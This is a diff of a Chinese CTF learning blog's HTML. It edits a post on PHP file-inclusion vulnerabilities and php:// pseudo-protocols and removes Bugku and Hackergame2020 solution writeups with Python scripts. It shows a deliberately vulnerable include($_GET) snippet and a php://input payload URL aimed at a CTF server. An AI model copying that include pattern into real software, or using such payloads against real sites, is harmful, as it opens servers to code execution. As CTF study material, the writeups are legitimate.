+      <a data-url="http://example.com/2020/12/05/C1CTF2020-WP/" data-id="cknopixik0000wsv0cfn3bb0f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -553,7 +744,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/02/wp-geekchallenge2020/" data-id="ckn4hz0qh0005b0v064fth6vr" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/02/wp-geekchallenge2020/" data-id="cknopixiz0006wsv01t93bhdr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -587,7 +778,7 @@ print(r.text)</code></pre>
       
         <p>最近在刷Bugku的题，看到题目”flag在index里”用到了文件包含漏洞和php伪协议的知识，想到之前也做过有关这个知识点的题，但是当时没有仔细学，这次打算仔细学学这些内容。</p>
 <p>0.文件包含漏洞</p>
-<p>PHP中文件包含函数有require()/require_once()/include()/include_once()，会将参数当做PHP代码运行，而include()运行过程如果出错，抛出一个警告之后仍会继续运行。而如果用户包含一些恶意文件呢？就会执行一些非预期代码，这就是文件包含漏洞。</p>
+<p>PHP中文件包含函数有require()/require_once()/include()/include_once()，会将参数包含（使当前代码类也能调用参数所在文件内的类）并当做PHP代码运行，而include()运行过程如果出错，抛出一个警告之后仍会继续运行。而如果用户包含一些恶意文件呢？就会执行一些非预期代码，这就是文件包含漏洞。</p>
 <p>1.本地文件包含漏洞</p>
 <p>(1)无限制文件包含漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -664,7 +855,6 @@ print(r.text)</code></pre>
 
 <p>预期解是猜测flag.txt的存在，然后得到flag.txt里的内容在GET传参。但是靠猜我觉得不大稳，还看到网上师傅们有非预期解。payload：<code>http://123.206.87.240:8002/web8/?ac=aaa&amp;fn=php://input</code>在POST传参”aaa”就得到flag了。</p>
 <p>我这里一开始很不解，因为我去查file_get_contents()这个函数发现如果查找不到文件会返回false，那他是怎么相等的？？之后发现是自己想错了。这里并非是先令fn=POST的值，然后再把这个值作为参数去file_get_contents()。而是先GET传参得到fn=php://input，然后通过file_get_contents(“php://input”）来直接读取POST的数据。可以理解成file_get_contents(“php://input”)是个固定搭配，就是把POST的数据当成一个文件读取的。</p>
-<p>这他妈就是大佬对知识的理解吗ORZ</p>
 <p>PPS：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/redfire/p/7695263.html">参考网站</a></p>
 <p>参考网站：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/182280.html">文件包含漏洞整体框架</a></p>
@@ -675,208 +865,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckn4hz0qn000cb0v08n1u7czk" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-python requests.session()的理解和base64在正则中的形式" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" class="article-date">
-  <time datetime="2020-11-19T13:34:01.941Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/">(1)python requests.session()的理解和(2)base64在正则中的形式</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>今天在bugku上做了个题–秋名山老司机</p>
-<p>点进去之后网页里给了一串算式字符串，要求计算出结果post给value</p>
-<p>我一看就乐了，之前科大ctf2020就有一个很相近的题，不过那个题需要求积分，这个只需要加减乘除就完事了。</p>
-<p>果断写脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line">patt&#x3D;&#39;[0-9]\S+[0-9]&#39;</span><br><span class="line">source&#x3D;requests.get(url)</span><br><span class="line">source.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">str1&#x3D;re.findall(patt,source.text)</span><br><span class="line">data&#x3D;&#123;&#39;value&#39;:(eval(str1[0]))&#125;</span><br><span class="line">r&#x3D;requests.post(url,data,header)</span><br><span class="line">r.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>发现跑不通啊，什么输出都没有</p>
-<p>改一下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line">header&#x3D;&#123;&quot;Cookie&quot;:&quot;PHPSESSID&#x3D;8ddda6ievus03fofmdr7mi9ohlak3fpj&quot;&#125;</span><br><span class="line">patt&#x3D;&#39;[0-9]\S+[0-9]&#39;</span><br><span class="line">source&#x3D;requests.get(url,header)</span><br><span class="line">source.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">str1&#x3D;re.findall(patt,source.text)</span><br><span class="line">print(str1[0])#新增</span><br><span class="line">data&#x3D;&#123;&#39;value&#39;:(eval(str1[0]))&#125;</span><br><span class="line">r&#x3D;requests.post(url,data,header)</span><br><span class="line">r.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>发现问题了，第一次输出的算式和第二次输出的算式不一样？！</p>
-<p>之后看了网上的题解明白了。得到source的那一段代码中的算式和post数据时的算式不一样，后者的算式更新了。本质是因为requests发送请求都是一次一次请求的，这两个请求不会被看做是有关联的，而是两次独立发送的请求。所以就用到了requests.session()。它是一个requests对象，通过它就可以让前面的请求保持状态(会在s=requests.session里面挂着)，方便我们在前一个请求的基础上发送第二个请求。</p>
-<p>因此再编写脚本，成功得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line">patt&#x3D;&#39;[0-9]\S+[0-9]&#39;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">source&#x3D;s.get(url)</span><br><span class="line">str1&#x3D;re.findall(patt,source.text)</span><br><span class="line">data&#x3D;&#123;&#39;value&#39;:(eval(str1[0]))&#125;</span><br><span class="line">r&#x3D;s.post(url,data)</span><br><span class="line">r.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>之后再看下一个题–速度要快</p>
-<p>注释说要post margin，发现请求头里有一个flag(测试知道这个flag可以经过两次base64解密得到margin的数值)，但关键在于，这个flag是会变的</p>
-<p>所以还是用到requests.session()，直接写脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:12603&#39;</span><br><span class="line">raw &#x3D; s.get(url)</span><br><span class="line"></span><br><span class="line">flag &#x3D; raw.headers[&#39;flag&#39;]</span><br><span class="line">flag &#x3D; base64.b64decode(flag).decode()#这里decode()的目的是把字节数据转换成字符串</span><br><span class="line">print(flag)</span><br><span class="line">patt&#x3D;&quot;\w+&#x3D;&#x3D;|\w+&#x3D;|\w+&quot;</span><br><span class="line">#这里不能只\w+，要考虑正则的所有可能，而且要先写&#x3D;&#x3D;的情况再写&#x3D;最后写纯数字字母的组合，否则第一个永远符合，永远匹配不到&#x3D;的情况</span><br><span class="line">flag &#x3D; re.findall(patt,flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">flag &#x3D; base64.b64decode(flag[2])</span><br><span class="line">raw &#x3D; s.post(url, &#123;&#39;margin&#39;: flag&#125;)</span><br><span class="line">print(raw.text)</span><br></pre></td></tr></table></figure>
-
-<p>注意:</p>
-<p>1.([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)<br>上面那个式子适合判断base64编码的正则，但是这里不适用，因为得到的tuple拼接字符串反而更麻烦了<br>原理:<br>字符串只可能包含A-Z，a-z，0-9，+，/，=字符<br>字符串长度是4的倍数<br>=只会出现在字符串最后，可能没有或者一个等号或者两个等号</p>
-<p>2.脚本有很多种方式编写，下面这种不用正则也没问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;120.24.86.145:8002&#x2F;web6&#x2F;&quot;</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">headers&#x3D;r.get(url).headers#因为flag在消息头里</span><br><span class="line"></span><br><span class="line">mid&#x3D;base64.b64decode(headers[&#39;flag&#39;])</span><br><span class="line">mid&#x3D;mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span><br><span class="line"></span><br><span class="line">flag &#x3D; base64.b64decode(mid.split(&#39;: &#39;)[1])#获得flag:后的值</span><br><span class="line">data&#x3D;&#123;&#39;margin&#39;:flag&#125;</span><br><span class="line">print (r.post(url,data).text)#post方法传上去</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckn4hz0qi0006b0v0dypm93e3" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Hackergame2020-部分题解" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
-  <time datetime="2020-11-11T11:39:50.747Z" itemprop="datePublished">2020-11-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.签到</p>
-<p>直接在url中把number改成1就好了</p>
-<p>2.猫咪问答</p>
-<p>12/256/9/9/17098</p>
-<p>3.2048</p>
-<p>看源码发现给了hint，打开static/js/html_actuator.js，发现了won之后的操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var url;</span><br><span class="line"> if (won) &#123;</span><br><span class="line">   url &#x3D; &quot;&#x2F;getflxg?my_favorite_fruit&#x3D;&quot; + (&#39;b&#39;+&#39;a&#39;+ +&#39;a&#39;+&#39;a&#39;).toLowerCase();</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">   url &#x3D; &quot;&#x2F;getflxg?my_favorite_fruit&#x3D;&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<p>后面那个字符串到网上一查发现是banana(原因<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30849591/article/details/100093053">在这</a>)</p>
-<p>直接构造payload：<a target="_blank" rel="noopener" href="http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana">http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana</a></p>
-<p>4.一闪而过的flag</p>
-<p>可以直接cmd打开，或者手速够快也可以</p>
-<p>5.从零开始的记账工具人</p>
-<p>写脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;&quot;肆角玖分贰角玖分壹元捌角柒分陆分&quot;&#x2F;&#x2F;这是最后一次，所以只有数量为10的了</span><br><span class="line">str1&#x3D;&quot;拾元分角&quot;</span><br><span class="line">str2&#x3D;&quot;壹贰叁肆伍陆柒捌玖&quot;</span><br><span class="line">str4&#x3D;&quot;123456789&quot;</span><br><span class="line">result&#x3D;1104009&#x2F;&#x2F;同样这里是第九次的result，result和data都是要根据次数去更换的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    data&#x3D;data.replace(str2[i],str4[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    if(data[i]&#x3D;&#x3D;&quot;拾&quot;):</span><br><span class="line">        if(data[i-1] in str4):</span><br><span class="line">            result&#x3D;result+int(data[i-1])*1000</span><br><span class="line">        else:</span><br><span class="line">            result&#x3D;result+1000</span><br><span class="line">    if(data[i]&#x3D;&#x3D;&quot;元&quot;):</span><br><span class="line">        if(data[i-1]&#x3D;&#x3D;&quot;拾&quot;):</span><br><span class="line">            result&#x3D;result</span><br><span class="line">        else:</span><br><span class="line">            result&#x3D;result+int(data[i-1])*100</span><br><span class="line">    if(data[i]&#x3D;&#x3D;&quot;角&quot;):</span><br><span class="line">        result&#x3D;result+int(data[i-1])*10</span><br><span class="line">    if(data[i]&#x3D;&#x3D;&quot;分&quot;):</span><br><span class="line">        result+&#x3D;int(data[i-1])</span><br><span class="line">print(result*0.01)#为了准确先*100让最小单位变为分，最后*0.01变回元</span><br><span class="line"></span><br><span class="line">#手动运行九次，每次data粘贴到浏览器的网址栏来去掉换行符。从1叠加到10就可以了，第一次全都加，最后一次data只包含10倍的金额</span><br><span class="line">ps:excel可以按照数量降序排列，提取数据会变得很简单</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p>最后得到flag{11042.80}</p>
-<p>6.超简单的世界模拟器</p>
-<p>(1)蝴蝶效应</p>
-<p>到网上查询研究了一下，找到了“宇宙飞船”</p>
-<p>第一个方块在6/7行，直接构造一个轻型飞船撞击他(参考网站<a target="_blank" rel="noopener" href="https://www.douban.com/note/690728776/">在这</a>)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">10010</span><br><span class="line"></span><br><span class="line">00001</span><br><span class="line"></span><br><span class="line">10001</span><br><span class="line"></span><br><span class="line">01111</span><br></pre></td></tr></table></figure>
-
-<p>得到flag{D0_Y0U_l1k3_g4me_0f_l1fe?_ab9c40cb18}</p>
-<p>关键在第二个</p>
-<p>(2)一石二鸟</p>
-<p>在网上搜集资料发现，生命游戏本质就是对生物竞争资源和抱团的模拟，当两个大种族(大于2<em>2)撞击，会发生毁灭，而最后资源会趋于稳态。也就是说，想消灭第二个方块，就要想办法构造一个块去撞击他。但是题目给的15\</em>15范围太小了，无论构造直线飞行的飞船还是小型滑翔机，都撞不到距离很远的第二个方块。结合题目说的蝴蝶效应，想到如果我放的种子可以自己发展出很多的块，就有可能撞到第二个块了。</p>
-<p>然后去看贴吧，找到某<a target="_blank" rel="noopener" href="http://jump2.bdimg.com/p/6880085102">贴子的11楼</a>真的有能自己疯狂发展壮大的种子(肯定不止这一个，但是这个就够用了)。</p>
-<p>发现下面左边的种子是向着左上发展，于是对称一下得到右边的可以朝着右下发展的种子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">010         110</span><br><span class="line"></span><br><span class="line">111         011</span><br><span class="line"></span><br><span class="line">001         010</span><br></pre></td></tr></table></figure>
-
-<p>尝试构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">000000000000110</span><br><span class="line"></span><br><span class="line">000000000000011</span><br><span class="line"></span><br><span class="line">000000000000010</span><br></pre></td></tr></table></figure>
-
-<p>得到flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_251eaa977d}</p>
-<p>8.自复读的复读机</p>
-<p>(1)反向复读</p>
-<p>google了解到了输出自身代码的程序叫做quine，直接google “reversed quine”还真的找到了这样的代码<code>with open(__file__)as f:print(f.read())</code></p>
-<p>其实本质和<code>print(open(__file__).read())</code>是一样的</p>
-<p>稍微改一下逆向输出就是<code>print(open(__file__).read()[::-1])</code>，把这段代码放在python里跑完全木的问题，输出就能得到<code>)]1-::[)(daer.)__elif__(nepo(tnirp</code>，我一看可乐坏了，这不就是我想要的吗</p>
-<p>然而，事情并没有那么简单。我在终端上发现跑不出来，output跑出来是<code>))(tupni(cexe</code>，这和reversed(code)可不相等，这是为什么呢？</p>
-<p>仔细思考了一下想明白了。这里后端的文件代码就是exec(input())，我输入了input()，但是这个input()并没有写入文件，而我代码功能实现的输出<strong>文件的</strong>代码，所以回显就只有<code>))(tupni(cexe</code>。</p>
-<p>第一时间我想到两种思路。</p>
-<p>第一种，想办法把input()读到的代码写进文件里，而且不能是单纯的写，而是要彻底更换文件的内容，把原来的<code>exec(input())</code>替换成<code>print(open(__file__).read())</code>，否则多出来的原来文件中的<code>exec(input())</code>永远会多出来，运行<strong>输入代码所得到的输出代码</strong>的就永远会比reversed(code)多一个<code>))(tupni(cexe</code>，也就永远不可能满足条件。</p>
-<p><em>这样会不会引发一个问题?</em></p>
-<p><em>Q:如果原来文件的exec(input())没了，改成我们的输入了。那么程序还会忠实地执行我们输入的代码？换言之，exec和input以及我们输入的东西都是什么时候开始生效的？是我们输入代码之后exec才开始执行；还是早在一开始，exec就已经启动，只等着我们的输入了呢？</em></p>
-<p><em>A:改写、写入文件并不是代码一执行，数据就会被写进文件去的。事实上，要写进的数据会先进缓冲区，等(__file__)被close()了或者手动flush()了，才会被写入，而且这个过程必定是exec已经执行完毕了，所以不会有矛盾。</em></p>
-<p>到这里我想到，既然input()无法影响__file__的read()，那或许可以在input先写一个write，再多加一个input()输入代码的逆序，第二个input使用__file__直接输出read()。</p>
-<p>就是说输入<code>open(__file__,&quot;w&quot;).write(input());print(open(__file__).read())</code>，然后在第二个我们自己写的input里输入上列的reversed。于是我自己写了一个exec(input())在本地python上运行发现真的可以。我兴高采烈的去终端上跑，结果他提示__Read-Only file system: ‘/runner.py’__。看来这个文件已经设置了无法通过exec(input())来改写文件了。。。(看了题解知道出题人设置了低权限。。。)把<code>__file__</code>改成”hahaha.txt”(相当于新创立了一个文件)也还是不行。出题人<del>我*￥#%</del>果然深思熟虑。</p>
-<p>我还就不信这个邪，又写了一个<code>print(input())</code>，打算在第二个input里写入reversed(code)，结果提示eof when reading a line，原因不明，但是放在自己的idle上是能跑出来的。估计是版本问题。。。</p>
-<p>这次真的服了，这个思路还是得判死刑啊。但是值得注意的是这三个payload在本地的idle上跑是完全没问题的。</p>
-<p>第二种方法，想办法直接读取input()的内存然后输出。很遗憾，查了将近40分钟，查询不到任何可以在input内部读取外面的input的办法。<strong>但是题解说这种思路是完全可行的，等一手大师傅的非预期QAQ。</strong></p>
-<p>那么就只能强行去想第三种方法了，就是构造一个足够巧妙的字符串能让”print”这个不对称的单词都得乖乖reversed。这个思路在网上一查很多，比如<code>_=&#39;_=%r;print _%%_&#39;;print _%_</code>或者<code>s=&#39;s=%r;print(s%%s,sep=&quot;&quot;)&#39;;print(s%s,sep=&quot;&quot;)</code>。但他们都是根正苗红的quine，我们需要的是reversed quine。该怎么办？</p>
-<p>终于，再一次去谷歌查询reversed quine。竟然发现了一个之前被我看漏的，而且可行！网站<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1364927/code-golf-reverse-quine">在这</a>，网站里面有一个python2的payload:<code>x=&#39;x=%r;print(x%%x)[::-1]&#39;;print(x%x)[::-1]</code>，我当时一看python2就觉得凉凉，结果下面评论就补充了python3的payload:<code>x=&#39;x=%r;print((x%%x)[::-1])&#39;;print((x%x)[::-1])</code><del>实际上这个和上面的s那个字符串是一样的。。。只是加了个[::-1]，怪我当时太懒没有仔细沿着这个思路去想QAQ</del>，马上把他拉到终端去跑，结果发现还是错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Your code is:</span><br><span class="line">&quot;x&#x3D;&#39;x&#x3D;%r;print((x%%x)[::-1])&#39;;print((x%x)[::-1])&quot;</span><br><span class="line"></span><br><span class="line">Output of your code is:</span><br><span class="line">&quot;)]1-::[)x%x((tnirp;&#39;)]1-::[)x%%x((tnirp;r%&#x3D;x&#39;&#x3D;x\n&quot;</span><br><span class="line"></span><br><span class="line">Checking reversed(code) &#x3D;&#x3D; output</span><br><span class="line">Failed!</span><br></pre></td></tr></table></figure>
-
-<p>emm，怎么多了个\n啊。查一查，发现input()是以换行结尾的(但这个换行不会计入字符串)，而print会自动加上一个换行符。这太好办了，直接把end改成””，再里面外面都改一次就完事了，得到payload:<code>x=&#39;x=%r;print((x%%x)[::-1],end=&quot;&quot;)&#39;;print((x%x)[::-1],end=&quot;&quot;)</code>，一跑直接爆出第一个flag：<code>flag&#123;Yes!_Y0U_h4v3_a_r3v3rs3d_Qu1ne_107fd54868&#125;</code>。</p>
-<p>下面的都是没做出来的QAQ</p>
-<p>7.从零开始的火星文生活</p>
-<p>题目给了一串字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">脦脪鹿楼脝脝脕脣 拢脠拢谩拢茫拢毛拢氓拢貌拢莽拢谩拢铆拢氓 碌脛路镁脦帽脝梅拢卢脥碌碌陆脕脣脣眉脙脟碌脛 拢忙拢矛拢谩拢莽拢卢脧脰脭脷脦脪掳脩 拢忙拢矛拢谩拢莽 路垄赂酶脛茫拢潞</span><br><span class="line">拢忙拢矛拢谩拢莽拢没拢脠拢麓拢枚拢鲁拢脽拢脝拢玫拢脦拢脽拢梅拢卤拢脭拢猫拢脽拢鲁拢卯拢茫拢掳拢盲拢卤拢卯拢莽拢脽拢麓拢脦拢盲拢脽拢盲拢鲁拢茫拢掳拢脛拢卤拢卯拢脟拢脽拢鹿拢帽拢脛拢虏拢脪拢赂拢猫拢贸拢媒</span><br><span class="line">驴矛脠楼卤脠脠眉脝陆脤篓脤谩陆禄掳脡拢隆</span><br><span class="line">虏禄脪陋脭脵掳脩脮芒路脻脨脜脧垄脳陋路垄赂酶脝盲脣没脠脣脕脣拢卢脪陋脢脟卤禄路垄脧脰戮脥脭茫赂芒脕脣拢隆</span><br></pre></td></tr></table></figure>
-
-<p>没思路啊。。。之后看题解给了一张图片，直呼nb</p>
-<p><img src="https://github.com/USTC-Hackergame/hackergame2020-writeups/raw/master/official/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E7%81%AB%E6%98%9F%E6%96%87%E7%94%9F%E6%B4%BB/files/%E5%B8%B8%E8%A7%81%E4%B9%B1%E7%A0%81.jpg" alt="常见乱码"></p>
-<p>所以先用古文码形式解发现是拼音码，再解一次得到flag</p>
-<p>直接贴上脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def solve(message):</span><br><span class="line">    answer&#x3D;(message.encode(&quot;gbk&quot;).decode(&quot;UTF-8&quot;).encode(&quot;iso-8859-1&quot;).decode(&#39;gbk&#39;))</span><br><span class="line">    return answer</span><br><span class="line">str&#x3D;&#39;脦脪鹿楼脝脝脕脣 拢脠拢谩拢茫拢毛拢氓拢貌拢莽拢谩拢铆拢氓 碌脛路镁脦帽脝梅拢卢脥碌碌陆脕脣脣眉脙脟碌脛 拢忙拢矛拢谩拢莽拢卢脧脰脭脷脦脪掳脩 拢忙拢矛拢谩拢莽 路垄赂酶脛茫拢潞 拢忙拢矛拢谩拢莽拢没拢脠拢麓拢枚拢鲁拢脽拢脝拢玫拢脦拢脽拢梅拢卤拢脭拢猫拢脽拢鲁拢卯拢茫拢掳拢盲拢卤拢卯拢莽拢脽拢麓拢脦拢盲拢脽拢盲拢鲁拢茫拢掳拢脛拢卤拢卯拢脟拢脽拢鹿拢帽拢脛拢虏拢脪拢赂拢猫拢贸拢媒 驴矛脠楼卤脠脠眉脝陆脤篓脤谩陆禄掳脡拢隆 虏禄脪陋脭脵掳脩脮芒路脻脨脜脧垄脳陋路垄赂酶脝盲脣没脠脣脕脣拢卢脪陋脢脟卤禄路垄脧脰戮脥脭茫赂芒脕脣拢隆&#39;</span><br><span class="line">print(solve(str))</span><br></pre></td></tr></table></figure>
